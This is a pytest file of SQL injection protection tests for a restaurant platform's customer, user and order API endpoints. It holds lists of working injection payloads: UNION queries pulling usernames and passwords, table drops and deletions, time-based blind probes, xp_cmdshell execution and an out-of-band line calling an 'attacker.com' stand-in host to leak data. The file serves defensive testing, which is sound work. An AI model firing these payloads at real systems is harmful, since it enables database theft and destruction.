"""
Comprehensive SQL Injection Protection Tests
Based on OWASP Testing Guide and Issue #360 requirements
"""
import pytest
from httpx import AsyncClient
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncSession
import json

from app.core.database import Customer, User, Restaurant, Product


# OWASP Top SQL Injection Payloads
OWASP_SQL_INJECTION_PAYLOADS = [
    # Classic SQL Injection
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "'; DROP TABLE users; --",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1#",
    "' or 1=1--",
    "' or 1=1/*",
    
    # Union-based attacks
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username, password FROM users--",
    "1' UNION ALL SELECT NULL,concat(username,':',password) FROM users#",
    
    # Time-based blind SQL injection
    "1' AND SLEEP(5)--",
    "1'; WAITFOR DELAY '00:00:05'--",
    "1' AND BENCHMARK(10000000,MD5('A'))--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    
    # Boolean-based blind SQL injection
    "' AND '1'='1",
    "' AND '1'='2",
    "1' AND 1=1--",
    "1' AND 1=2--",
    
    # Stacked queries
    "1'; INSERT INTO users (username, password) VALUES ('hacker', 'password')--",
    "1'; UPDATE users SET password='hacked' WHERE username='admin'--",
    "1'; DELETE FROM products WHERE 1=1--",
    
    # Out-of-band attacks
    "1' AND (SELECT LOAD_FILE(concat('\\\\\\\\',version(),'.attacker.com\\\\a')))--",
    
    # Second-order SQL injection payloads
    "admin'--",
    "admin' or '1'='1",
    
    # Special characters and encoding
    "';--",
    "';#",
    "';/*",
    "%27%20OR%20%271%27%3D%271",  # URL encoded
    "\\'; DROP TABLE users; --",
    
    # PostgreSQL specific
    "'; SELECT pg_sleep(5); --",
    "'; COPY users TO '/tmp/users.txt'; --",
    "'; CREATE TABLE hacked (data text); --",
    
    # Advanced techniques
    "1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>65--",
    "' OR UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
]

# Additional malicious patterns from issue #360
ADVANCED_INJECTION_PATTERNS = [
    # Dynamic column/table injection attempts
    "products WHERE 1=1; DROP TABLE products; --",
    "'; exec xp_cmdshell 'net user'; --",
    
    # Filter bypass attempts
    "/**/UNION/**/SELECT/**/",
    "UN/**/ION SEL/**/ECT",
    "UNI%00ON SEL%00ECT",
    
    # Comment variations
    "--",
    "#",
    "/*",
    "//",
    "-- -",
    
    # Null byte injection
    "%00' OR '1'='1",
    "\x00' OR '1'='1",
    
    # Case variation attacks
    "' Or '1'='1",
    "' oR '1'='1",
    "' OR '1'='1",
]


@pytest.mark.asyncio
class TestComprehensiveSQLInjection:
    """Comprehensive SQL injection tests based on OWASP guidelines"""
    
    async def test_customer_search_sql_injection(
        self, 
        async_client: AsyncClient,
        test_user: User,
        test_restaurant: Restaurant,
        auth_headers: dict,
        db_session: AsyncSession
    ):
        """Test SQL injection in customer search endpoint"""
        # Create a test customer
        customer = Customer(
            restaurant_id=test_restaurant.id,
            email="test@example.com",
            phone="1234567890",
            first_name="Test",
            last_name="Customer"
        )
        db_session.add(customer)
        await db_session.commit()
        
        # Test each OWASP payload
        for payload in OWASP_SQL_INJECTION_PAYLOADS:
            # Test in different search fields
            search_requests = [
                {"email": payload},
                {"phone": payload},
                {"name": payload},
                {"search": payload},
                {
                    "email": payload,
                    "phone": payload,
                    "name": payload
                }
            ]
            
            for search_data in search_requests:
                response = await async_client.post(
                    "/api/v1/customers/search",
                    json=search_data,
                    headers=auth_headers
                )
                
                # Should handle safely without 500 errors
                assert response.status_code in [200, 400, 422], \
                    f"Payload '{payload}' caused unexpected status: {response.status_code}"
                
                # Verify database integrity
                customer_count = await db_session.scalar(
                    text("SELECT COUNT(*) FROM customers")
                )
                assert customer_count >= 0, "Customers table was damaged"
                
                # Verify no unauthorized data exposure
                if response.status_code == 200:
                    data = response.json()
                    # Should not expose user passwords or sensitive data
                    response_text = json.dumps(data)
                    assert "password" not in response_text.lower()
                    assert "secret" not in response_text.lower()
    
    async def test_sort_parameter_injection(
        self,
        async_client: AsyncClient,
        auth_headers: dict,
        db_session: AsyncSession
    ):
        """Test SQL injection in sort parameters"""
        malicious_sort_params = [
            "created_at; DROP TABLE customers; --",
            "email' UNION SELECT password FROM users--",
            "(SELECT password FROM users)",
            "1; DELETE FROM customers WHERE 1=1--",
        ]
        
        for sort_param in malicious_sort_params:
            response = await async_client.post(
                "/api/v1/customers/search",
                json={
                    "sort_by": sort_param,
                    "sort_order": "asc"
                },
                headers=auth_headers
            )
            
            # Should reject invalid sort fields
            assert response.status_code in [400, 422], \
                f"Sort param '{sort_param}' was not rejected"
            
            # Verify error message doesn't reveal SQL structure
            if response.status_code == 422:
                error_data = response.json()
                error_msg = json.dumps(error_data).lower()
                assert "sql" not in error_msg
                assert "query" not in error_msg
                assert "select" not in error_msg
    
    async def test_platform_user_search_injection(
        self,
        async_client: AsyncClient,
        platform_owner_headers: dict,
        db_session: AsyncSession
    ):
        """Test SQL injection in platform user search"""
        for payload in ADVANCED_INJECTION_PATTERNS:
            response = await async_client.get(
                f"/api/v1/platform/users?search={payload}",
                headers=platform_owner_headers
            )
            
            # Should handle safely
            assert response.status_code in [200, 400, 422]
            
            # Verify users table intact
            user_count = await db_session.scalar(
                text("SELECT COUNT(*) FROM users")
            )
            assert user_count >= 0
    
    async def test_filter_chaining_injection(
        self,
        async_client: AsyncClient,
        auth_headers: dict
    ):
        """Test SQL injection with multiple filter parameters"""
        # Complex injection attempts combining multiple parameters
        complex_payloads = [
            {
                "email": "test@example.com",
                "phone": "'; DROP TABLE customers; --",
                "name": "' OR '1'='1"
            },
            {
                "restaurant_id": "' UNION SELECT id FROM users--",
                "min_spent": "0 OR 1=1",
                "search": "'; DELETE FROM orders; --"
            }
        ]
        
        for payload in complex_payloads:
            response = await async_client.post(
                "/api/v1/customers/search",
                json=payload,
                headers=auth_headers
            )
            
            assert response.status_code in [200, 400, 422]
    
    async def test_uuid_validation(
        self,
        async_client: AsyncClient,
        auth_headers: dict
    ):
        """Test UUID parameter validation against SQL injection"""
        malicious_uuids = [
            "'; DROP TABLE restaurants; --",
            "' OR '1'='1",
            "12345678-1234-1234-1234-123456789012' OR '1'='1",
            "12345678-1234-1234-1234-123456789012'; DELETE FROM users; --",
        ]
        
        for bad_uuid in malicious_uuids:
            # Test various endpoints that accept UUIDs
            endpoints = [
                f"/api/v1/restaurants/{bad_uuid}",
                f"/api/v1/customers/{bad_uuid}",
                f"/api/v1/orders/{bad_uuid}",
            ]
            
            for endpoint in endpoints:
                response = await async_client.get(
                    endpoint,
                    headers=auth_headers
                )
                
                # Should reject invalid UUIDs
                assert response.status_code in [400, 404, 422]
    
    async def test_numeric_field_injection(
        self,
        async_client: AsyncClient,
        auth_headers: dict
    ):
        """Test SQL injection in numeric fields"""
        numeric_payloads = [
            "1 OR 1=1",
            "1; DROP TABLE orders; --",
            "1 UNION SELECT password FROM users",
            "-1 OR 1=1",
            "9999999999 OR EXISTS(SELECT * FROM users)",
        ]
        
        for payload in numeric_payloads:
            # Test min_spent parameter
            response = await async_client.post(
                "/api/v1/customers/search",
                json={"min_spent": payload},
                headers=auth_headers
            )
            
            # Should reject non-numeric values
            assert response.status_code in [400, 422]
    
    async def test_error_message_information_disclosure(
        self,
        async_client: AsyncClient,
        auth_headers: dict
    ):
        """Ensure error messages don't reveal SQL structure"""
        # Trigger various errors with SQL injection attempts
        test_cases = [
            ("/api/v1/customers/search", {"email": "' OR '1'='1"}),
            ("/api/v1/customers/search", {"sort_by": "'; DROP TABLE users; --"}),
            ("/api/v1/customers/' OR '1'='1", {}),
        ]
        
        for endpoint, payload in test_cases:
            if payload:
                response = await async_client.post(
                    endpoint,
                    json=payload,
                    headers=auth_headers
                )
            else:
                response = await async_client.get(
                    endpoint,
                    headers=auth_headers
                )
            
            # Check error responses don't leak SQL info
            if response.status_code >= 400:
                error_text = response.text.lower()
                
                # Should not reveal SQL keywords or structure
                sql_keywords = [
                    "select", "insert", "update", "delete", "drop",
                    "union", "join", "where", "from", "table",
                    "column", "syntax", "sql", "query", "database"
                ]
                
                for keyword in sql_keywords:
                    assert keyword not in error_text, \
                        f"Error message exposed SQL keyword: {keyword}"
    
    async def test_second_order_injection_prevention(
        self,
        async_client: AsyncClient,
        auth_headers: dict,
        db_session: AsyncSession,
        test_restaurant: Restaurant
    ):
        """Test second-order SQL injection prevention"""
        # Create customer with malicious name
        malicious_customer_data = {
            "email": "secondorder@test.com",
            "phone": "9876543210",
            "first_name": "Robert'); DROP TABLE customers;--",
            "last_name": "Tables"
        }
        
        # Create customer
        response = await async_client.post(
            "/api/v1/customers",
            json=malicious_customer_data,
            headers=auth_headers
        )
        
        assert response.status_code in [200, 201]
        customer_id = response.json()["data"]["id"]
        
        # Now search for this customer - the malicious name should be safely handled
        response = await async_client.post(
            "/api/v1/customers/search",
            json={"name": "Robert"},
            headers=auth_headers
        )
        
        assert response.status_code == 200
        
        # Verify customers table still exists
        customer_count = await db_session.scalar(
            text("SELECT COUNT(*) FROM customers")
        )
        assert customer_count > 0
    
    async def test_null_byte_injection(
        self,
        async_client: AsyncClient,
        auth_headers: dict
    ):
        """Test null byte injection attempts"""
        null_byte_payloads = [
            "test\x00' OR '1'='1",
            "test%00' OR '1'='1",
            "\x00'; DROP TABLE users; --",
            "admin\x00' --",
        ]
        
        for payload in null_byte_payloads:
            response = await async_client.post(
                "/api/v1/customers/search",
                json={"email": payload},
                headers=auth_headers
            )
            
            # Should handle null bytes safely
            assert response.status_code in [200, 400, 422]
    
    async def test_encoding_bypass_attempts(
        self,
        async_client: AsyncClient,
        auth_headers: dict
    ):
        """Test various encoding bypass attempts"""
        encoded_payloads = [
            # URL encoding
            "%27%20OR%20%271%27%3D%271",
            # Unicode encoding
            "\u0027 OR \u00271\u0027=\u00271",
            # Hex encoding
            "0x27204F522027312027203D2027312027",
            # Mixed case
            "' Or '1'='1",
            # Comments and spaces
            "'/**/OR/**/1=1",
        ]
        
        for payload in encoded_payloads:
            response = await async_client.post(
                "/api/v1/customers/search",
                json={"search": payload},
                headers=auth_headers
            )
            
            assert response.status_code in [200, 400, 422]
    
    async def test_benchmark_protection(
        self,
        async_client: AsyncClient,
        auth_headers: dict,
        db_session: AsyncSession
    ):
        """Verify protection against all SQL injection patterns from audit"""
        # Track any database modifications
        initial_counts = {
            "customers": await db_session.scalar(text("SELECT COUNT(*) FROM customers")),
            "users": await db_session.scalar(text("SELECT COUNT(*) FROM users")),
            "restaurants": await db_session.scalar(text("SELECT COUNT(*) FROM restaurants")),
            "orders": await db_session.scalar(text("SELECT COUNT(*) FROM orders")),
        }
        
        # Test all payloads
        all_payloads = OWASP_SQL_INJECTION_PAYLOADS + ADVANCED_INJECTION_PATTERNS
        
        for payload in all_payloads:
            # Test multiple endpoints
            await async_client.post(
                "/api/v1/customers/search",
                json={"search": payload},
                headers=auth_headers
            )
        
        # Verify no data loss or unauthorized modifications
        final_counts = {
            "customers": await db_session.scalar(text("SELECT COUNT(*) FROM customers")),
            "users": await db_session.scalar(text("SELECT COUNT(*) FROM users")),
            "restaurants": await db_session.scalar(text("SELECT COUNT(*) FROM restaurants")),
            "orders": await db_session.scalar(text("SELECT COUNT(*) FROM orders")),
        }
        
        # No tables should be dropped or have unauthorized deletions
        for table, initial_count in initial_counts.items():
            assert final_counts[table] >= initial_count * 0.9, \
                f"Significant data loss detected in {table} table"